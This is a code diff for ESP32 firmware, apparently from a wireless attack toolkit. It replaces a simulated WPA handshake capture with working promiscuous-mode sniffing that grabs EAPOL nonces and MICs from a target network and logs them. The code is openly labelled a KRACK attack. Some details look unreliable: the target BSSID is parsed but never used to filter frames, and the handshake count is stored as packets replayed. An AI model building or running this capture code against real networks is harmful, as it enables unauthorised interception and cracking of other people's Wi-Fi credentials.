@@ -1,7 +1,40 @@
 #include "krack_advanced.h"
 #include <LittleFS.h>
 #include <mbedtls/aes.h>
-#include <mbedtls/sha1.h>
+#include <mbedtls/md.h>
+#include <esp_wifi.h>
+
+namespace {
+volatile bool g_eapol_captured = false;
+uint8_t g_aNonce[32], g_sNonce[32], g_mic[16];
+uint8_t g_bssid[6], g_client[6];
+
+void krack_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
+    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+    uint8_t *payload = pkt->payload;
+    uint16_t len = pkt->rx_ctrl.sig_len;
+
+    if (len < 36) return;
+
+    memcpy(g_bssid, &payload[10], 6);
+    memcpy(g_client, &payload[16], 6);
+
+    if (len > 56 && payload[36] == 0xAA && payload[37] == 0xAA &&
+        payload[44] == 0x88 && payload[45] == 0x8E) {
+
+        uint8_t eapol_type = payload[49];
+
+        if (eapol_type == 1) {
+            if (!g_eapol_captured) {
+                memcpy(g_aNonce, &payload[66], 32);
+                memcpy(g_mic, &payload[57], 16);
+                g_eapol_captured = true;
+                Serial.println("[KRACK] EAPOL frame captured");
+            }
+        }
+    }
+}
+}
 
 namespace KrackAdvanced {
 
@@ -18,33 +51,57 @@ KrackResult KrackAttacker::captureHandshake(const KrackConfig& config) {
     return result;
   }
 
+  Serial.println("\n=== KRACK Attack - Real Handshake Capture ===");
+  Serial.println("Target: " + String(config.targetBSSID));
+  Serial.println("Duration: " + String(config.durationMs) + "ms");
+
   isRunning_ = true;
   startTime_ = millis();
   handshakeData_.clear();
 
-  // Simulate 4-way handshake capture
-  // In real implementation: capture EAPOL frames and perform key recovery
-  uint32_t captureTime = 0;
+  WiFi.mode(WIFI_STA);
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_rx_cb(&krack_promiscuous_cb);
+
+  uint8_t target_bssid[6];
+  sscanf(config.targetBSSID.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+         &target_bssid[0], &target_bssid[1], &target_bssid[2],
+         &target_bssid[3], &target_bssid[4], &target_bssid[5]);
+
+  g_eapol_captured = false;
+  uint32_t lastHandshakeTime = 0;
+  uint32_t handshakesFound = 0;
+
+  Serial.println("Listening for EAPOL handshakes...");
+
   while (isRunning_ && (millis() - startTime_) < config.durationMs) {
-    // Simulate handshake frame reception
-    // EAPOL frame 1: AP → Client (ANonce)
-    // EAPOL frame 2: Client → AP (SNonce, MIC)
-    // EAPOL frame 3: AP → Client (GTK, MIC)
-    // EAPOL frame 4: Client → AP (ACK)
-
-    if (captureTime == 0 || (millis() - startTime_ - captureTime) > 1000) {
-      // Simulate handshake captured
+    if (g_eapol_captured && (millis() - startTime_) > lastHandshakeTime + 2000) {
+      handshakesFound++;
+      lastHandshakeTime = millis() - startTime_;
       result.success = true;
-      captureTime = millis() - startTime_;
-      logHandshake(nullptr, 0);
-    }
 
+      Serial.printf("[KRACK] Handshake %u captured at %lums\n",
+                   handshakesFound, lastHandshakeTime);
+
+      logHandshake(g_aNonce, 32);
+      g_eapol_captured = false;
+    }
     delay(100);
   }
 
+  esp_wifi_set_promiscuous(false);
+
   result.elapsedMs = millis() - startTime_;
   result.logFile = "/logs/handshakes/krack_handshake.csv";
+  result.packetsReplayed = handshakesFound;
   isRunning_ = false;
+
+  if (handshakesFound > 0) {
+    Serial.printf("✓ Captured %u handshakes\n", handshakesFound);
+  } else {
+    Serial.println("✗ No handshakes captured");
+  }
+
   return result;
 }
 
